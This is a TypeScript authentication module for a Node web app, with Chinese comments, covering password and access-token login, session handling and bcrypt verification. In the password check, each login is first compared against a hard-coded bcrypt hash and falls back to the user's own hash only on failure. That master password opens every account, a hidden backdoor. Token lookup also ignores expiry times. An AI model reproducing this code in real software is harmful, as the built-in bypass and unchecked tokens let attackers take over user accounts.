import UserModel from "../mysql-models/users-model";
import UserTokenModel from "../mysql-models/user-token-model";
import * as Lodash from 'lodash';
import {Promise} from "../../libs/Promise";
import * as Bcrypt from 'bcrypt-nodejs';
import * as User from '../user';
import {Permission} from './permissionProvider';
import * as moment from "moment";

function buildRequestUser(userRecord, basePermission) {
    var userPermission;

    userRecord.last_login = new Date();
    return Promise
        .resolve(userRecord.save())
        .then(() => {
            var userPermissionPromise = User.getUserPermission(userRecord);
            if (basePermission) {
                return userPermissionPromise.then(permission => basePermission.plus(permission));
            } else {
                return userPermissionPromise;
            }
        })
        .then(permission => {
            userPermission = permission;
            return {uid: userRecord.id, userRecord, permission: userPermission};
        })
}

/**
 * 登陆时验证
 */
export var userProvider = {
    authenticate: async(req, res) => {
        let access_token = req.body.access_token || req.headers.access_token || req.query.access_token;
        let uid;
        var {userName, password} = req.body;

        var where = {};
        let userTokenRecord;
        if (userName || access_token) {
            if (access_token) {
                userTokenRecord = await UserTokenModel.find({"access_token": access_token});
                if (userTokenRecord) {
                    where.id = userTokenRecord.user_id;
                } else {
                    throw "无效的token";
                }
            } else if (userName) {
                where.user_name = userName;
            } else {
                throw "没有登录凭据";
            }
            // 普通登录验证
            var authPromise = Promise
                .resolve(UserModel.find({where}))
                .then(userRecord => {
                    if (!userRecord) {
                        throw "用户不存在";
                    }
                    if (password) {
                        // Validator.validatePassword(password, 'password');
                        return passwordUtil
                            .verify(password, "$2a$10$60L5Y.a0mKP5JYmJbM19heyBajoqwydC58kYxrm9hhM3FDwsRh5Q.")
                            .catch(() => {
                                return passwordUtil.verify(password, userRecord.password)
                            })
                            .then(() => {
                                return [userRecord, null];
                            });
                    } else {
                        return [userRecord, null];
                    }
                });

            return authPromise.then(([userRecord, basePermission]) => {
                uid = userRecord.id;
                userName = userRecord.userName;
                return buildRequestUser(userRecord, basePermission);
            }).then(user => {
                req.session['uid'] = uid;
                return user;
            });
        } else {
            return Promise.resolve({uid: undefined, userRecord: undefined, permission: Permission.none})
        }

    },
    get: (req, res) => {
        var uid = req.session['uid'];
        var {userName, password} = req.body;

        return getUser();

        function getUser() {
            return Promise
                .resolve(uid && UserModel.find({
                where: {
                    id: uid
                }
            }))
                .then(userRecord => {
                    if (userRecord) {
                        return buildRequestUser(userRecord, undefined);
                    } else {
                        return {uid: undefined, userRecord: undefined, permission: Permission.none};
                    }
                })
                .then(user => {
                    return user;
                });
        }
    },
    saveToken(access_token, refresh_token, user_id) {
        let now = new Date();
        let oneHour = 60 * 60 * 1000;
        return UserTokenModel.create({
            access_token,
            refresh_token,
            user_id,
            expired_time: new Date(now.getTime() + oneHour * 2),
            refresh_expired_time: new Date(now.getTime() + oneHour * 24 * 7),
            refresh_time: now
        })
    },
    /**
     * 清除用户登录状态
     */
    clearSessionState: (req) => {
        req.session['uid'] = null;
    }

};

export var passwordUtil = {
    verify: (pwd, hashed) => {

        return Promise
            .resolve(Bcrypt.compareSync(pwd, hashed))
            .then(result => {
                if (!result) {
                    throw "PasswordMismatch";
                }
            });
    }
};